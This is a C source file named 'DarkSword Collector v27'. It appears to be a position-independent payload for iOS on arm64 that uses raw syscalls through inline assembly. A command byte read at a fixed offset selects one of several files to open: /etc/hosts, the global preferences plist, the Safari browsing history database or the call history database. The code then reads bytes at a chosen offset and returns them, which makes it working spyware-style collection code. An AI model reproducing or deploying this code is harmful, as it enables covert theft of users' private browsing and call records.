/**
 * DarkSword Collector v27 - Fixed: inline paths instead of pointer array
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory");
    return x0;
}

#define SYS_open   5
#define SYS_read   3
#define SYS_close  6
#define SYS_lseek  199
#define SEEK_SET   0

int ds_start(void) {
    long base = (long)ds_start - 0x4000L;
    volatile unsigned char *cmd = (volatile unsigned char*)(base + 0x100L);

    int file_id = cmd[0];
    int offset = (cmd[1] << 8) | cmd[2];

    /* Inline paths — no global pointer array (would need relocation) */
    const char *path;
    switch (file_id) {
        case 0: path = "/etc/hosts"; break;
        case 1: path = "/var/mobile/Library/Preferences/.GlobalPreferences.plist"; break;
        case 2: path = "/var/mobile/Library/Safari/History.db"; break;
        case 3: path = "/var/mobile/Library/CallHistoryDB/CallHistory.storedata"; break;
        default: return 0xBAD00000 | file_id;
    }

    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0xDEAD0000 | file_id;

    if (offset > 0) {
        _svc4(SYS_lseek, fd, (long)offset, SEEK_SET, 0);
    }

    unsigned char buf[4] = {0};
    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
    _svc1(SYS_close, fd);

    if (n < 1) return 0xBEEF0000 | file_id;

    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
}
